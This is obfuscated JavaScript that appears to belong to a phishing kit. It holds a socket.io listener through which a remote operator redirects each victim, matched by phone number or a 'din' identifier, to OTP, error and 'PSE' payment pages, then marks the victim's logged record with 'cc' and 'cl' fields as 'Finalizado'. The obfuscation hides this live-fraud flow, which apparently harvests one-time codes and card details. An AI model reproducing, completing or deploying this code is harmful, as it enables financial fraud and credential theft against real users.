const _0x244952 = _0x44c1;
(function (_0xbd9d, _0x23703a) {
  const _0x556c1d = _0x44c1,
    _0x3086b8 = _0xbd9d();
  while (!![]) {
    try {
      const _0x30d583 =
        (-parseInt(_0x556c1d(0x1d4)) / 0x1) *
          (-parseInt(_0x556c1d(0x1dc)) / 0x2) +
        parseInt(_0x556c1d(0x1d7)) / 0x3 +
        parseInt(_0x556c1d(0x1e1)) / 0x4 +
        (-parseInt(_0x556c1d(0x1d0)) / 0x5) *
          (-parseInt(_0x556c1d(0x1cb)) / 0x6) +
        -parseInt(_0x556c1d(0x1c9)) / 0x7 +
        parseInt(_0x556c1d(0x1c6)) / 0x8 +
        (parseInt(_0x556c1d(0x1d6)) / 0x9) *
          (-parseInt(_0x556c1d(0x1cd)) / 0xa);
      if (_0x30d583 === _0x23703a) break;
      else _0x3086b8["push"](_0x3086b8["shift"]());
    } catch (_0x38c2c7) {
      _0x3086b8["push"](_0x3086b8["shift"]());
    }
  }
})(_0x2469, 0x1c35d);
function _0x2469() {
  const _0x560d07 = [
    "reg",
    "8779BubMBx",
    "./errorPse.html",
    "63bnuItB",
    "493398YzRMai",
    "GET",
    "metaInfo",
    "valor",
    "./index.error.html",
    "14nozRwV",
    "idreg",
    "stringify",
    "application/json",
    "PUT",
    "378260ChWJxQ",
    "./otp.html",
    "location",
    "Finalizado",
    "1118360qhMaNp",
    "Usuario\x20encontrado",
    "href",
    "51828zSLOck",
    "json",
    "80214sKvcNJ",
    "telnum",
    "806570zJjvbj",
    "valid",
    "logs",
    "85frqcss",
    "din",
    "finish",
  ];
  _0x2469 = function () {
    return _0x560d07;
  };
  return _0x2469();
}
function _0x44c1(_0x29b7d0, _0x5a6115) {
  const _0x246959 = _0x2469();
  return (
    (_0x44c1 = function (_0x44c112, _0x2623dd) {
      _0x44c112 = _0x44c112 - 0x1c3;
      let _0x466735 = _0x246959[_0x44c112];
      return _0x466735;
    }),
    _0x44c1(_0x29b7d0, _0x5a6115)
  );
}
var socket = io["connect"](url);
socket["on"](_0x244952(0x1cf), function (_0x5dc59b) {
  const _0x3ad19f = _0x244952;
  if (
    _0x5dc59b[_0x3ad19f(0x1da)] == "us" &&
    _0x5dc59b[_0x3ad19f(0x1ce)] == info[_0x3ad19f(0x1d9)]["telnum"]
  )
    window[_0x3ad19f(0x1c4)][_0x3ad19f(0x1c8)] = _0x3ad19f(0x1db);
  else {
    if (
      _0x5dc59b[_0x3ad19f(0x1da)] == _0x3ad19f(0x1d1) &&
      _0x5dc59b[_0x3ad19f(0x1ce)] == info[_0x3ad19f(0x1d9)][_0x3ad19f(0x1cc)]
    )
      window[_0x3ad19f(0x1c4)]["href"] = _0x3ad19f(0x1c3);
    else {
      if (
        _0x5dc59b[_0x3ad19f(0x1da)] == "newdin" &&
        _0x5dc59b[_0x3ad19f(0x1ce)] == info[_0x3ad19f(0x1d9)][_0x3ad19f(0x1cc)]
      )
        window[_0x3ad19f(0x1c4)]["href"] = "./otp.error.html";
      else {
        if (
          _0x5dc59b[_0x3ad19f(0x1da)] == _0x3ad19f(0x1d2) &&
          _0x5dc59b[_0x3ad19f(0x1ce)] ==
            info[_0x3ad19f(0x1d9)][_0x3ad19f(0x1cc)]
        ) {
          async function _0x2d0334() {
            const _0x5186d4 = _0x3ad19f,
              _0x1c755f = await fetch(url + "/logs/logs", {
                method: _0x5186d4(0x1d8),
                headers: { "Content-Type": _0x5186d4(0x1df) },
              }),
              _0x3a8030 = await _0x1c755f[_0x5186d4(0x1ca)](),
              _0xc79ccb = [..._0x3a8030];
            for (const _0x1e5d69 of _0xc79ccb) {
              if (
                _0x1e5d69[_0x5186d4(0x1d3)] == info["metaInfo"]["cc"] &&
                _0x1e5d69["cl"] == info[_0x5186d4(0x1d9)][_0x5186d4(0x1cc)]
              ) {
                console["log"](_0x5186d4(0x1c7));
                const _0x392499 = await fetch(
                    url + "/logs/logFinish/" + _0x1e5d69[_0x5186d4(0x1dd)],
                    {
                      method: _0x5186d4(0x1e0),
                      headers: { "Content-Type": _0x5186d4(0x1df) },
                      body: JSON[_0x5186d4(0x1de)]({
                        status: _0x5186d4(0x1c5),
                      }),
                    }
                  ),
                  _0x1f8ffb = await _0x392499[_0x5186d4(0x1ca)]();
              }
            }
            window[_0x5186d4(0x1c4)][_0x5186d4(0x1c8)] = _0x5186d4(0x1d5);
          }
          _0x2d0334();
          return;
        }
      }
    }
  }
});
